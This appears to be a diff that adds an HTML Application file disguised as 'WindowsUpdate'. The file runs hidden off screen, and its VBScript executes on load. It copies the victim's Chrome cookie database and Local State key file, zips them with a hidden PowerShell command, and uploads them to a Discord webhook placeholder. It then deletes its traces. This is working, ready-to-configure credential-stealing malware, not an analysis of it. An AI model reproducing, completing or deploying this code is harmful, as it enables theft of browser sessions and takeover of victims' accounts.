@@ -1,0 +1,69 @@
+<html>
+<head>
+<hta:application id="oHTA" applicationname="WindowsUpdate" border="none" caption="no" showintaskbar="no" scroll="no" windowstate="minimize" />
+<script language="VBScript">
+Sub Window_OnLoad
+    window.resizeTo 0,0
+    window.moveTo -2000,-2000
+    Set shell = CreateObject("WScript.Shell")
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set http = CreateObject("MSXML2.XMLHTTP")
+    Set ado = CreateObject("ADODB.Stream")
+    
+    userProfile = shell.ExpandEnvironmentStrings("%USERPROFILE%")
+    cookies = userProfile & "\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
+    localState = userProfile & "\AppData\Local\Google\Chrome\User Data\Local State"
+    tempZip = shell.ExpandEnvironmentStrings("%TEMP%") & "\upd.zip"
+    webhook = "YOUR_DISCORD_WEBHOOK_URL_HERE"
+    
+    If fso.FileExists(cookies) Then
+        fso.CopyFile cookies, shell.ExpandEnvironmentStrings("%TEMP%") & "\ck.tmp", True
+        fso.CopyFile localState, shell.ExpandEnvironmentStrings("%TEMP%") & "\ls.tmp", True
+        
+        shell.Run "powershell -WindowStyle Hidden -Command Compress-Archive -Path '" & shell.ExpandEnvironmentStrings("%TEMP%") & "\ck.tmp','" & shell.ExpandEnvironmentStrings("%TEMP%") & "\ls.tmp' -DestinationPath '" & tempZip & "' -Force", 0, True
+        
+        Set ado = CreateObject("ADODB.Stream")
+        ado.Type = 1
+        ado.Open
+        ado.LoadFromFile tempZip
+        zipData = ado.Read
+        ado.Close
+        
+        boundary = "---------------------------Boundary"
+        body = "--" & boundary & vbCrLf & "Content-Disposition: form-data; name=""file""; filename=""cookies.zip""" & vbCrLf & "Content-Type: application/zip" & vbCrLf & vbCrLf
+        
+        Set ado = CreateObject("ADODB.Stream")
+        ado.Type = 1
+        ado.Open
+        ado.Write TextToBytes(body)
+        ado.Write zipData
+        ado.Write TextToBytes(vbCrLf & "--" & boundary & "--" & vbCrLf)
+        
+        http.Open "POST", webhook, False
+        http.setRequestHeader "Content-Type", "multipart/form-data; boundary=" & boundary
+        http.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+        http.Send ado.Read
+        ado.Close
+        
+        fso.DeleteFile shell.ExpandEnvironmentStrings("%TEMP%") & "\ck.tmp"
+        fso.DeleteFile shell.ExpandEnvironmentStrings("%TEMP%") & "\ls.tmp"
+        fso.DeleteFile tempZip
+    End If
+    window.close
+End Sub
+
+Function TextToBytes(str)
+    Set s = CreateObject("ADODB.Stream")
+    s.Type = 2
+    s.Charset = "utf-8"
+    s.Open
+    s.WriteText str
+    s.Position = 0
+    s.Type = 1
+    TextToBytes = s.Read
+    s.Close
+End Function
+</script>
+</head>
+<body></body>
+</html>
